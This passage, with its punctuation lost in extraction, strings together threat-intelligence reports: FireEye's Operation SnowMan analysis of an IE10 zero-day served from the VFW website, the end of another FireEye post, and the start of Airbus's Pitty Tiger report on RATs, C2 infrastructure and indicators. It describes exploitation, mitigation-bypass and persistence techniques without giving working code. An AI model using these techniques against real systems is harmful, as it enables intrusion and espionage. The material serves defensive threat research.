different from a technical perspective, each supports distinct political objectives. Operation Poisoned
Hurricane
s objective appeared to have in part been IP theft possibly for economic gain or other
competitive advantages. In the DDOS attacks, the objective was to silence free speech and suppress the
pro democracy movement in Hong Kong. The Chinese government is the entity most likely to be
interested in achieving both of these objectives.
APPENDIX
MD5s
c3d6450075d618b1edba17ee723eb3ca
d08e038d318b94764d199d7a85047637
84bd0809b1dbc2dc86f30d30faaa7e4e
39bb90140fc0101f49377b6c60076f9d
caa5529010c17b969da01ade084794c6
17bc9d2a640da75db6cbb66e5898feb1
0b54ae49fd5a841970b98a078968cb6b
e2a4b96cce9de4fb126cfd5f5c73c3ed
ecf21054ab515946a812d1aa5c408ca5
HOSTNAMES
tommo[.]jp
mizma.co[.]jp
sp.you-maga[.]com
nitori-tour[.]com
ninekobe[.]com
shinzenho[.]jp
wizapply[.]com
www.credo-biz[.]com
www.sapporo-digital-photoclub[.]com
wakayamasatei[.]com
luxscena[.]com
java-se[.]com
hk.java-se[.]com
u.java-se[.]com
jre76.java-se[.]com
p.java-sec[.]com
This entry was posted in Threat Intelligence, Threat Research and tagged advanced malware,
Cybersecurity, malware, zero-day by Ned Moran, Mike Oppenheim and Mike Scott. Bookmark the
permalink.
Operation SnowMan: DeputyDog Actor Compromises US Veterans of
Foreign Wars Website
On February 11, FireEye identified a zero-day exploit (CVE-2014-0322) being served up from the U.S.
Veterans of Foreign Wars
 website (vfw[.]org). We believe the attack is a strategic Web compromise
targeting American military personnel amid a paralyzing snowstorm at the U.S. Capitol in the days leading
up to the Presidents Day holiday weekend. Based on infrastructure overlaps and tradecraft similarities, we
believe the actors behind this campaign are associated with two previously identified campaigns
(Operation DeputyDog and Operation Ephemeral Hydra).
This blog post examines the vulnerability and associated attacks, which we have dubbed 
Operation
SnowMan.
Exploit/Delivery analysis
After compromising the VFW website, the attackers added an iframe into the beginning of the website
HTML code that loads the attacker
s page in the background. The attacker
s HTML/JavaScript page runs a
Flash object, which orchestrates the remainder of the exploit. The exploit includes calling back to the IE 10
vulnerability trigger, which is embedded in the JavaScript. Specifically, visitors to the VFW website were
silently redirected through an iframe to the exploit at www.[REDACTED].com/Data/img/img.html.
Mitigation
The exploit targets IE 10 with Adobe Flash. It aborts exploitation if the user is browsing with a different
version of IE or has installed Microsoft
s Experience Mitigation Toolkit (EMET). So installing EMET or
updating to IE 11 prevents this exploit from functioning.
Vulnerability analysis
The vulnerability is a previously unknown use-after-free bug in Microsoft Internet Explorer 10. The
vulnerability allows the attacker to modify one byte of memory at an arbitrary address. The attacker uses
the vulnerability to do the following:
      Gain access to memory from Flash ActionScript, bypassing address space layout randomization
      (ASLR)
      Pivot to a return-oriented programing (ROP) exploit technique to bypass data execution prevention
      (DEP)
EMET detection
The attacker uses the Microsoft.XMLDOM ActiveX control to load a one-line XML string containing a file
path to the EMET DLL. Then the exploit code parses the error resulting from the XML load order to
determine whether the load failed because the EMET DLL is not present. The exploit proceeds only if this
check determines that the EMET DLL is not present.
ASLR bypass
Because the vulnerability allows attackers to modify memory to an arbitrary address, the attacker can use
it to bypass ASLR. For example, the attacker corrupts a Flash Vector object and then accesses the
corrupted object from within Flash to access memory. We have discussed this technique and other ASLR
bypass approaches in our blog. One minor difference between the previous approaches and this attack is
the heap spray address, which was changed to 0x1a1b2000 in this exploit.
Code execution
Once the attacker
s code has full memory access through the corrupted Flash Vector object, the code
searches through loaded libraries gadgets by machine code. The attacker then overwrites the vftable
pointer of a flash.Media.Sound() object in memory to point to the pivot and begin ROP. After successful
exploitation, the code repairs the corrupted Flash Vector and flash.Media.Sound to continue execution.
Shellcode analysis
Subsequently, the malicious Flash code downloads a file containing the dropped malware payload. The
beginning of the file is a JPG image; the end of the file (offset 36321) is the payload, encoded with an XOR
key of 0
95. The attacker appends the payload to the shellcode before pivoting to code control. Then,
when the shellcode is executed, the malware creates files 
sqlrenew.txt
 and 
stream.exe
. The tail of the
image file is decoded, and written to these files. 
sqlrenew.txt
 is then executed with the LoadLibraryA
Windows API call.
ZxShell payload analysis
As documented above, this exploit dropped an XOR (0
95) payload that executed a ZxShell backdoor
(MD5: 8455bbb9a210ce603a1b646b0d951bce). The compile date of the payload was 2014-02-11, and the
last modified date of the exploit code was also 2014-02-11. This suggests that this instantiation of the
exploit was very recent and was deployed for this specific strategic Web compromise of the Veterans of
Foreign Wars website. A possible objective in the SnowMan attack is targeting military service members to
steal military intelligence. In addition to retirees, active military personnel use the VFW website. It is
probably no coincidence that Monday, Feb. 17, is a U.S. holiday, and much of the U.S. Capitol shut down
Thursday amid a severe winter storm.
The ZxShell backdoor is a widely used and publicly available tool used by multiple threat actors linked to
cyber espionage operations. This particular variant called back to a command and control server located at
newss[.]effers[.]com. This domain currently resolves to 118.99.60.142. The domain info[.]flnet[.]org also
resolved to this IP address on 2014-02-12.
Infrastructure analysis
The info[.]flnet[.]org domain overlaps with icybin[.]flnet[.]org and book[.]flnet[.]org via the previous
resolutions to the following IP addresses:
      58.64.200.178
      58.64.200.179
      103.20.192.4
First Seen       Last Seen         CnC Domain           IP
2013-08-31       2013-08-31        icybin.flnet[.]org   58.64.200.178
2013-05-02       2013-08-02        info.flnet[.]org     58.64.200.178
2013-08-02       2013-08-02        book.flnet[.]org     58.64.200.178
2013-08-10       2013-08-10        info.flnet[.]org     58.64.200.179
2013-07-15       2013-07-15        icybin.flnet[.]org   58.64.200.179
2014-01-02       2014-01-02        book.flnet[.]org     103.20.192.4
2013-12-03       2014-01-02        info.flnet[.]org     103.20.192.4
We previously observed Gh0stRat samples with the custom packet flag 
HTTPS
 calling back to
book[.]flnet[.]org and icybin[.]flnet[.]org. The threat actor responsible for Operation DeputyDog also
used the 
HTTPS
 version of the Gh0st. We also observed another 
HTTPS
 Gh0st variant connecting to
a related command and control server at me[.]scieron[.]com.
MD5 Hash                         CnC Domain
758886e58f9ea2ff22b57cbbb015166e book.flnet[.]org
0294f9280491f85d898ebe471f0fb58e icybin.flnet[.]org
9d20566a327076b7152bbf9ed20292c4 me.scieron[.]com
The me[.]scieron[.]com domain previously resolved to 58.64.199.22. The book[.]flnet[.]org domain also
resolved to another IP in the same subnet 58.64.199.0/24. Specifically, book[.]flnet[.]org previously
resolved to 58.64.199.27.
Others domain seen resolving to this same /24 subnet were dll[.]freshdns[.]org, ali[.]blankchair[.]com,
and cht[.]blankchair[.]com. The domain dll[.]freshdns[.]org resolved to 58.64.199.25. Both
ali[.]blankchair[.]com and cht[.]blankchair[.]com resolved to 58.64.199.22.
First Seen       Last Seen         CnC Domain             IP
2012-11-12       2012-11-28        me.scieron[.]com     58.64.199.22
2012-04-09       2012-10-24        cht.blankchair[.]com 58.64.199.22
2012-04-09       2012-09-18        ali.blankchair[.]com 58.64.199.22
2012-11-08       2012-11-25        dll.freshdns[.]org   58.64.199.25
2012-11-23       2012-11-27        rt.blankchair[.]com 58.64.199.25
2012-05-29       2012-6-28         book.flnet[.]org     58.64.199.27
A number of other related domains resolve to these IPs and other IPs also in this /24 subnet. For the
purposes of this blog, we
ve chosen to focus on those domains and IP that relate to the previously
discussed DeputyDog and Ephemeral Hydra campaigns.
You may recall that dll[.]freshdns[.]org, ali[.]blankchair[.]com and cht[.]blankchair[.]com were all linked
to both Operation DeputyDog and Operation Ephemeral Hydra. Figure 1 illustrates the
infrastructure overlaps and connections we observed between the strategic Web compromise campaign
leveraging the VFW
s website, the DeputyDog, and the Ephemeral Hydra operations.
Figure 1: Ties between Operation SnowMan, DeputyDog, and Ephemeral Hydra
Links to DeputyDog and Ephemeral Hydra
Other tradecraft similarities between the actor(s) responsible for this campaign and the actor(s)
responsible for the DeputyDog/Ephemeral Hydra campaigns include:
      The use of zero-day exploits to deliver a remote access Trojan (RAT)
      The use of strategic web compromise as a vector to distribute remote access Trojans
      The use of a simple single-byte XOR encoded (0
95) payload obfuscated with a .jpg extension
      The use of Gh0stRat with the 
HTTPS
 packet flag
      The use of related command-and-control (CnC) infrastructure during the similar time frames
We observed many similarities from the exploitation side as well. At a high level, this attack and the CVE-
2013-3163 attack both leveraged a Flash file that orchestrated the exploit, and would call back into IE
JavaScript to trigger an IE flaw. The code within the Flash files from each attack are extremely similar.
They build ROP chains and shellcode the same way, both choose to corrupt a Flash Vector object, have
some identical functions with common typos, and even share the same name.
Conclusion
These actors have previously targeted a number of different industries, including:
      U.S. government entities
      Japanese firms
      Defense industrial base (DIB) companies
      Law firms
      Information technology (IT) companies
      Mining companies
      Non-governmental organizations (NGOs)
The proven ability to successfully deploy a number of different private and public RATs using zero-day
exploits against high-profile targets likely indicates that this actor(s) will continue to operate in the mid to
long-term.
This entry was posted in Advanced Malware, Exploits, Targeted Attack, Threat Research, Vulnerabilities
and tagged 0day, zero-day by Darien Kindlund, Dan Caselden, Xiaobo Chen, Ned Moran and Mike Scott.
Bookmark the permalink.
           Pitty Tiger Group
                            The Eye of the Tiger
        Credits:                     Ivan FONTARENSKY                           Malware Research
                                     Fabien PERIGAUD                            Reverse Engineering
                                     Ronan MOUCHOUX                             Threat Intelligence
                                     Cedric PERNET                              Threat Intelligence
                                     David BIZEUL                               Head of CSIRT
Public release
Threat Intelligence
                                           
The Eye of the Tiger
                                     Page : 1/58
                         Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
    EXECUTIVE SUMMARY
                                Operation Pitty Tiger 
The Eye of the Tiger
      Cyber espionage has been a hot topic through the last years. Computer attacks known as 
      (Advanced Persistent Threat) have become widely reported and emphasized by the media,
      damages are now considered as real and strategic trends are moving in cyber defense.
      AIRBUS Defence & Space 
 CyberSecurity unit responds to such attacks for its customers every
      day, developing a complete range of solutions.
      Today, we decided to release publicly information on a specific group of APT attackers known as
      
Pitty Tiger
. This information comes directly from investigations led by our Threat Intelligence.
      Pitty Tiger is a group of attackers that have been active since at least 2011. They have targeted
      private companies in several sectors, such as defense and telecommunications, but also at least
      one government.
      We have been able to track down this group of attackers and can provide detailed information
      about them. We were able to collect and reveal their 
malware arsenal
. We also analyzed their
      technical organization.
      Our investigations indicate that Pitty Tiger has not used any 0day vulnerability so far, rather they
      prefer using custom malware, developed for the group
s exclusive usage. Our discoveries
      indicate that Pitty Tiger is a group of attackers with the ability to stay under the radar, yet still not
      as mature as other groups of attackers we monitor.
      Pitty Tiger is probably not a state-sponsored group of attackers. They lack the experience and
      financial support that one would expect from state-sponsored attackers. We suppose this group
      is opportunistic and sells its services to probable competitors of their targets in the private sector.
      We have been able to leverage several attackers profiles, showing that the Pitty Tiger group is
      fairly small compared to other APT groups, which is probably why we saw them work on a very
      limited amount of targets.
      At the end of this report, we provide indicators of compromise to help people detect current Pitty
      Tiger attacks.
    Public release
    Threat Intelligence
                                                 
The Eye of the Tiger
                         Page : 2/58
                               Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
    TABLE OF CONTENT
    EXECUTIVE SUMMARY ..................................................................................................... 2
    TABLE OF CONTENT......................................................................................................... 3
    MODUS OPERANDI: APT ATTACKS ................................................................................ 5
           Reconnaissance phase.......................................................................................................... 5
           Initial compromise .................................................................................................................. 6
           Access strengthening & lateral moves ................................................................................... 6
           Data exfiltration ...................................................................................................................... 7
    
PITTY TIGER
 INVESTIGATION CONTEXT .................................................................... 8
    INFECTION METHODS....................................................................................................... 9
           Spear Phishing and weaponized documents ......................................................................... 9
           Direct attacks ....................................................................................................................... 10
    MALWARE INFORMATION .............................................................................................. 12
           Troj/ReRol.A ........................................................................................................................ 12
           PittyTiger RAT ..................................................................................................................... 16
           CT RAT................................................................................................................................ 19
           MM RAT (aka Troj/Goldsun-B) ............................................................................................. 23
           Paladin RAT ........................................................................................................................ 26
           Leo RAT .............................................................................................................................. 28
    INFRASTRUCTURE .......................................................................................................... 30
           Avstore.com.tw .................................................................................................................... 30
           Skypetm.com.tw .................................................................................................................. 32
           Common characteristics between the two domains ............................................................. 35
           Other domains linked with the Pitty Tiger group ................................................................... 36
    VICTIMS ............................................................................................................................ 39
    ATTACKERS ..................................................................................................................... 40
           Attacker
s connections to the c&c ........................................................................................ 40
           
TooT
 .................................................................................................................................. 44
           
Cold & Snow
...................................................................................................................... 48
           Roles and organization ........................................................................................................ 48
           Attackers arsenal ................................................................................................................. 49
    ATTRIBUTION .................................................................................................................. 53
    CONCLUSION ................................................................................................................... 56
    INDICATORS .................................................................................................................... 57
           Domains .............................................................................................................................. 57
           Malware hashes................................................................................................................... 57
           Malware Strings ................................................................................................................... 58
    Public release
    Threat Intelligence
                                                               
The Eye of the Tiger
                                             Page : 3/58
                                         Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
    Public release
    Threat Intelligence
                                              
The Eye of the Tiger
                        Page : 4/58
                            Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
    MODUS OPERANDI: APT ATTACKS
    APT attacks follow what we call the 
APT kill chain
. The kill chain describes briefly the way
    attackers do perform their actions.
    It can be summarized by the following scheme:
          RECONNAISSANCE PHASE
    The reconnaissance phase commences when an attacker selects a new target and involves the
    acquisition of information about that target.
    There is very little information available about this phase, and there is little data about it. The only
    way to collect information about this phase would be to already monitor all attackers
 actions at this
    step, which is hardly feasible.
    The longer the attackers spend time in attempting to understand their target and its online presence,
    the easier it will be to find efficient ways to penetrate that company
s systems.
    This reconnaissance phase is both about finding information to break into the targeted network
    successfully and about searching for data which could help to accelerate sensitive information
    isolation (like the name of a key employee for example).
    Public release
    Threat Intelligence
                                                
The Eye of the Tiger
                        Page : 5/58
                              Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
    This phase mostly relies on open sources from the Internet: social networks, press releases, white
    papers, corporate websites, search engines, but also on some active tools like vulnerability
    scanners etc.
          INITIAL COMPROMISE
    At this stage, the APT attackers have a solid knowledge of their target and its key employees. The
    attackers have everything they need to start looking for an entry point to the company
s network and
    establish one or several permanent backdoors into the environment.
    The attackers mostly rely on two techniques here to infect one or several computers, usually
    workstations, inside the target
s network: spear phishing and drive-by downloads.
    Spear phishing can be described as targeted e-mail phishing. In a spear phishing scheme, attackers
    send very few e-mails to targeted people. In fact, they can even send just a single e-mail. The trick
    is to target the right victim and provide it with the right content, so that they will click on a link leading
    to drive-by download of a malware, or open an attached file which will infect their computer.
    Some groups of attackers also use 
watering hole
 techniques to successfully compromise their
    targets. To build a watering hole attack, attackers do compromise the website of a third party,
    generally a supplier of the target, which is typically visited by a specific group of professionals and
    very likely by the target. Every visitor of the compromised third party is then infected. The method
    has one major drawback: it will also infect third parties who visit the website. Attackers have
    developed ways to avoid this. If their reconnaissance phase has been done effectively, they already
    know all IP ranges used by the target company. It just takes a few lines of code in the infecting script
    to only compromise visitors coming from the target IP ranges.
    Direct attacks against servers of the target can also be a way to penetrate the target
s network.
          ACCESS STRENGTHENING & LATERAL MOVES
    Attackers have gained access to one or several machines inside the target
s corporate network.
    They need to install several different backdoors in order to be able to always access the network. In
    case one backdoor falls, there will be others.
    As soon as the attackers are sure they have enough access, they start looking for two things:
    intellectual property (or anything else they want to know or steal) in alignment with predefined
    mission objectives, and a means of privilege escalation to facilitate lateral movement within the
    compromised environment. It generally does not take long before the attackers gain domain
    administrator privileges and dump all the Active Directory content.
    They use lateral moves between machines inside the network, and look for everything they need.
    This step is very hard to detect, since they only use valid credentials and legitimate administration
    tools such as PsExec.
    Public release
    Threat Intelligence
                                                  
The Eye of the Tiger
                         Page : 6/58
                                Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
            DATA EXFILTRATION
    Data exfiltration is the last step before the attackers loop to the lateral moves step, in a never-ending
    circle of prolonged access and information theft.
    They generally create archive files containing the content they want to exfiltrate, which are then sent
    to the attackers by using a remote administration tool (RAT) or transfer protocols such as FTP and
    HTTP.
    This phase is not the end of an APT attack. The attackers loop to the access strengthening/lateral
    moves stage and generally keep stealing more information and stay inside the network for more
    data gathering.
    For more information about all the APT phases, please refer to our APT Kill Chain blog post serie1.
    1
        http://blog.cassidiancybersecurity.com/tag/APT
    Public release
    Threat Intelligence
                                                 
The Eye of the Tiger
                        Page : 7/58
                               Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
    
PITTY TIGER
 INVESTIGATION CONTEXT
    During our regular investigations on APT cases, one particular variant of malware caught our
    attention, because we had not faced it before. We decided to spend some time to investigate around
    this malware and found out that it was used exclusively by a single group of attackers. This malware
    family is known as 
PittyTiger
 by the anti-virus research community.
    We discovered this malware sample in June 2014, leading to a command & control (c&c) server still
    in activity.
    Our researches around this particular malware family revealed the 
Pitty Tiger
 group has been
    active since 2011, yet we found other publications1 which could probably be attributed to the same
    group of attacker back in 20102.
    This group uses other malware and tools during their APT operations, in addition to the PittyTiger
    RAT.
    A variant of the infamous Gh0st RAT dubbed 
Paladin
 has been used repeatedly by the PT group,
    together with other RATs which seem to be developed exclusively for the PT group: 
MM RAT
 (aka
    Troj/Goldsun-B), and 
CT RAT
. Another variant of Gh0st RAT named 
 has been found inactive
    on a c&c server.
    We also found another malware, named 
Troj/ReRol.A
. This one is also used by the group to infect
    workstations, collect system information, and install more malware on the infected computer. It acts
    as a first stage downloader and system data collector often used in the initial compromise of the
    Pitty Tiger campaigns, generally embedded in Microsoft Office documents.
    Thanks to server
s misconfigurations, we managed to get information from three c&c servers used
    by this group of attackers, which provided us with insight from the end of 2013 to the beginning of
    July 2014.
    Our investigation has been focused on the data we could get from these c&c servers but also on the
    Pitty Tiger environment.
    This whitepaper aims to expose the view we have on the group, especially on their infrastructure
    and capabilities. We hope this publication will bring further counter analysis from the research
    community to enrich the global common threat knowledge.
    1
     http://nakedsecurity.sophos.com/2012/08/03/poisoned-doc-targeted-malware-attack/
    2
     http://nakedsecurity.sophos.com/2010/06/24/targeted-trident-cyberattack-defence-company/
    Public release
    Threat Intelligence
                                                
The Eye of the Tiger
                        Page : 8/58
                              Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
    INFECTION METHODS
          SPEAR PHISHING AND WEAPONIZED DOCUMENTS
    Pitty Tiger, like most other APT groups, use spear phishing e-mails extensively in order to gain an
    initial foothold within the targeted environment.
    We have been able to find a spear phishing e-mail crafted by the attackers. This e-mail spoofed the
    identity of an employee of a targeted company:
    From: XXXXXXX
    To: XXXXXXX
    File: 1 Attachment: Bird
s Eye Point of View.doc
    While the holiday season means clustering clustering 
time for a
    vacation
 for many, there are Those That Will Be of us staying home this
    year. That
s why we
ve Decided to take you on a trip around the world
    from a bird
s eye view of the item! It
s safe to say That MOST of the
    lucky people on vacation Will not see breathtaking sights like these.
    Remember to look down!
    XXXXXX
    The attached file is a Microsoft Office Word document triggering CVE-2014-1761 to infect the
    computer it is sent to:
                          Word document used to infect computers with Troj/ReRol.A
    Public release
    Threat Intelligence
                                                
The Eye of the Tiger
                        Page : 9/58
                              Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
    While this example looks very 
amateur
 for a spear phishing attempt, we suppose the group has
    conducted more advanced spear phishing campaigns, based on the fact that we found infected
    Word documents showing content stolen from victims of the group. These documents were infecting
    the system with Troj/ReRol.A malware, which we will detail later in this report.
    This could mean that the Pitty Tiger group is using stolen material as spear phishing content either
    to target other persons in the compromised company, or to target other persons in a competitor
    company, or more generally to compromise another target.
    Pitty Tiger also seem to use fake Microsoft Office Excel content, yet we could only find empty
    content delivering once again the Troj/ReRol.A malware.
            DIRECT ATTACKS
    Although we have not been able to find evidences of any attack aimed at exploiting vulnerabilities on
    the group
s targets servers, we have been able to record several vulnerability scanning launched
    from one c&c server straight to the targets.
    The attackers have been using different vulnerability scanners aimed at their targets. While some
    targets have been scanned with 
generic
 vulnerability scanning tools like HScan or Fluxay and port
    scanners like Nmap, some other targets have been scanned for very specific vulnerabilities, like a
    ZyWALL vulnerability or a FORTINET product.
    We have also been able to testify that the Pitty Tiger group has successfully collected information on
    some of their targets by exploiting the HeartBleed1 bug. This vulnerability which exists on some old
    versions of OpenSSL allows attackers to collect data from chunks of memory from the targeted
    machine. It allowed the Pitty Tiger group to get admin credentials from at least one target, for
    example.
                      Memory data leak from one server 
 Heartbleed exploit on one of PittyTiger
s targets
    1
        http://heartbleed.com/
    Public release
    Threat Intelligence
                                                    
The Eye of the Tiger
                                   Page : 10/58
                                  Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
    Running automated vulnerability scanners on whole ranges of IP addresses used by the targets or
    on several domains is a very noisy way to collect information and find server vulnerabilities. We
    would advocate that this method is unwise when you want to stay furtive, and doing it from a c&c
    server is very surprising, to say the least. While the Pitty Tiger group is experienced on some
    aspects on its running APT campaigns, it definitely lacks some maturity here.
    Public release
    Threat Intelligence
                                              
The Eye of the Tiger
                        Page : 11/58
                            Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
    MALWARE INFORMATION
          TROJ/REROL.A
    One of the favorite methods used by the Pitty Tiger group to infect users is to use a Microsoft Office
    Word document which exploits a specific vulnerability.
    The payload infecting the system is malware known as 
Troj/ReRol.A
. It is generally the first step of
    the initial compromise for Pitty Tiger campaigns.
    Exploitation
    We have been able to find one such document1 used by that group of attacker, exploiting CVE-
    2012-0158, an old critical vulnerability impacting Microsoft Office and corrected by Microsoft
    MS12-027 fix in April 2012. This vulnerability affects Microsoft Office versions up to Office 2010. We
    also found one RTF document embedding CVE-2014-1761, which is a more recent exploit.
    We discovered several different documents spreading this malware by triggering CVE-2012-0158
    vulnerability, yet we could not share them in this report, since these documents contain information
    about victims of the Pitty Tiger group.
    The discovery of this 
 vulnerability exploitation in June 2014 could mean that the Pitty Tiger
    group has no direct access to 0day exploits, or not enough budgets to buy some. It could also mean
    they use their low range exploit by default because it is working on their targets and is sufficient to
    compromise their workstations.
    The Word document we initially found was probably a 
test
 document used by the group. When
    opened, it shows a single line written in Chinese language, which can be translated as 
Hello!
                          Microsoft Office Word decoy 
test document
 used by the Pitty Tiger group
    Installation
    When successfully triggered, the exploit infects the host by dropping and executing a file named
    
svohost.exe
2 in the temporary folder of the currently logged-in user:
    1
     MD5 hash: e70c0479cdb9aa031a263740365e7939
    2
     MD5 hash: 1752aacc08ee0acd58405e9bc10b0dbb
    Public release
    Threat Intelligence
                                                   
The Eye of the Tiger
                             Page : 12/58
                                 Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
                      C:\DOCUME~1\USER\LOCALS~1\Temp\svohost.exe
    This binary is 
Troj/ReRol.A
 according to Sophos naming convention1. It immediately triggers
    alarms on our sandbox:
                            Alarms in our sandbox system, triggered by the Troj/ReRol.A malware
    The binary drops a copy of itself in the Application Data folder of the currently logged-in user:
                          Creation of a copy of the Pitty Tiger malware in a user folder in our sandbox
    The malware initiates a communication to time.windows.com to check for connectivity, and then
    communicates with the c&c server at mac.avstore.com.tw.
    1
     http://www.sophos.com/en-us/threat-center/threat-analyses/viruses-and-spyware/Troj~Rerol-
       A/detailed-analysis.aspx
    Public release
    Threat Intelligence
                                                    
The Eye of the Tiger
                                Page : 13/58
                                  Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
                Beginning of an encrypted communication between the Troj/ReRol.A malware and its c&c server
    Very few variants of Troj/ReRol.A are public. The variants we have seen did use that same User-
    Agent:
                      Mozilla/4.0 (compatible;)
    The persistence mechanism used by the malware is the creation of a registry key named 
Shell
    containing the path to the malware on the infected system:
              Key Path: \REGISTRY\USER\<SID>\Software\Microsoft\Windows
              NT\CurrentVersion\Winlogon
              Value Name : Shell
              Value : explorer.exe,C:\DOCUME~1\XXXXXX\APPLIC~1\svohost.exe,
    The payload of this malware is used to collect information on the newly infected host, and send it
    back to the c&c server. It can also download and execute binaries.
    Command & Control
    The data sent in the POST request has a 0x11 bytes header consisting of a fixed-value byte (0xc3)
    followed by a 0x10 bytes encryption key. The data following the header is encrypted using RC4 with
    the previous key. Once the data is deciphered, the last byte of the clear text should also be 0xc3.
    We have been able to decrypt the communications and confirmed what is transmitted to the c&c
    server.
    Public release
    Threat Intelligence
                                                   
The Eye of the Tiger
                            Page : 14/58
                                 Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
    Here is an anonymized sample of communication showing information collected by the malware:
              HostName :xxx
              UserName :xxx
              SysType :32bit
              Windows 7 Enterprise Service Pack 1 6.1 7601
              Organization:
              Owner:xxx
              --------------Server Info-------------------
              - AdobeARMservice
              - Adobe Acrobat Update Service
              - AeLookupSvc
              - Application Experience
              - AudioEndpointBuilder
              - 
 (list goes on)
              --------------Soft Info-------------------
                     1   Adobe AIR 4.0.0.1390
                     2   Adobe Shockwave Player 12.0 12.0.9.149
                     3   FileZilla Client 3.7.4.1 3.7.4.1
                     4   Mozilla Thunderbird 24.3.0 (x86 en-US) 24.3.0
                     5   
 (list goes on)
              --------------IP Config-------------------
              Adapt Type: Ethernet
              NetCardNum:       11
              NetCard Name:     {XXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}
              Description :     Realtek RTL8139C+ Fast Ethernet NIC
              MAC-ADDR:         XX-XX-XX-XX-XX-XXX
              IP-Addr:          10.xxx.xxx.xxx
              IP-Mask:          255.255.255.0
              GateWay:          10.xxx.xxx.xxx
              DHCP Serv:        1
              DHCP Host:        10.xxx.xxx.xxx
              WINS Serv:        0
              WINS PriHost:
              WINS SecHost:
                                 Sample information collected by Troj/ReRol.A malware
    This information is very useful for an attacker: it shows all software installed on the system, and
    running services.
    Once this data has been transferred to the c&c server, it responds by sending additional malware to
    execute on the machine.
    The c&c part consists of two files:
       - dr.asp: an ASP frontend instantiating a control, setting some variables, and passing the
          payload.
       - JHttpSrv.dll: a controller which should be registered via 
regsvr32
. It exposes 4 methods
          which can be called by the ASP script:
              o SetIP(strIP): sets the bot IP address
              o AddKeyword(strKeyword, strFilePath): binds a keyword to a binary on the server
              o Work(lpByteArray, nDataLength): deciphers the payload, looks for the registered
                  keywords, and writes it to a logfile
              o ResponseBinary(): sends back the binary matching a specific a keyword
    Public release
    Threat Intelligence
                                                 
The Eye of the Tiger
                        Page : 15/58
                               Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
    The dr.asp registers the following keywords:
       - 
SysType :32bit
 to the binary 
32.exe
       - 
SysType :64bit
 to the binary 
64.exe
    These two binaries were no longer available on the server. However, we found various files which
    could have been used as 
32.exe
 in the past:
       - 3200.exe
       - 322.exe
       - 32m.exe
       - 32mm.exe
    The 322.exe file is a legitimate, Chinese, calc.exe tool. It might have been used by the attackers to
    perform tests.
    The 3 others binaries are RATs, which will be detailed in the next parts.
           PITTYTIGER RAT
    This RAT is the origin of the attackers
 group name. 
PittyTiger
 is a mutex used by the malware.
    
Pitty Tiger
 is also a string transmitted in the network communications of the RAT, as you will see in
    this chapter.
    Installation
    The malware1, when running in our sandbox, triggers the following alarms:
                           Alarms in our sandbox system, triggered by the PittyTiger malware
    The binary drops two files in 
C:\Windows\System32
    1
        MD5 hash : be18418cafdb9f86303f7e419a389cc9
    Public release
    Threat Intelligence
                                                
The Eye of the Tiger
                         Page : 16/58
                              Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
                                 Files dropped by the PittyTiger RAT in our sandbox
    The 
qmgrxp.exe
 binary is a simple copy of the original binary. It drops the 
packet64.dll
, and
    injects it in 
explorer.exe
. When executed, a mutex called 
PittyTiger
 is created.
    Persistence is achieved by adding the path to the binary to the WinlogonUserInit key:
              Key Path: \REGISTRY\USER\<SID>\Software\Microsoft\Windows
              NT\CurrentVersion\Winlogon
              Value Name: UserInit
              Value: C:\WINDOWS\system32\userinit.exe,C:\WINDOWS\system32\qmgrxp.exe,
    The 
packet64.dll
 is the main payload of the RAT. After being injected, it starts sending its Hello
    packet to its c&c server:
                                     Sample communication from PittyTiger RAT
    Public release
    Threat Intelligence
                                               
The Eye of the Tiger
                        Page : 17/58
                             Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
    Command & Control
    All the requests sent to the c&c contains the string 
/FC001/
 followed by the bot id. This id consists
    of the infected computer name followed by a dash and the lower word of the disk serial id.
    The data sent is simply encoded using base64, there is no cipher at all. The hello packet, once
    decoded, looks like the following:
                 --------------------------PittyTigerV1.0                           ---------------------
                 --------------                           ^ ^            ----------------------------
                 --------------                             ^            ----------------------------
                 Version:NULL
    Our sample had 3 c&c servers configured:
       - jackyandy.avstore.com.tw:80
       - chanxe.avstore.com.tw:443
       - newb02.skypetm.com.tw:80
    The following commands are implemented:
       - File Download (get) and Upload (put)
       - Screen Capture 8bit (prtsc) and 16bit (prtsc2)
       - Remote Shell (ocmd/ccmd)
       - Configuration update (setserv/freshserv)
       - Direct command execution
    Regarding the controller part, we found two different versions:
       - A Delphi binary handling PittyTiger connections only
       - A .NET binary handling both PittyTiger and CT connections
    The interface handling both Pitty TIGER and CT connections is very interesting. We have been able
    to confirm that the author of those two families of malware is the same person, as will be seen in the
    next chapter about 
CT RAT
                                            Pitty Tiger RAT 
 controller part
    Public release
    Threat Intelligence
                                                
The Eye of the Tiger
                           Page : 18/58
                              Copyright 
 2014 Airbus Defence & Space - All rights reserved
Operation Pitty Tiger 
The Eye of the Tiger
           CT RAT
    This remote administration tool is often used by the Pitty Tiger group. We have been able to acquire
    both the client and the server parts.
    We found two instances of the same binary with different names 
 32mm.exe and mm32.exe1.
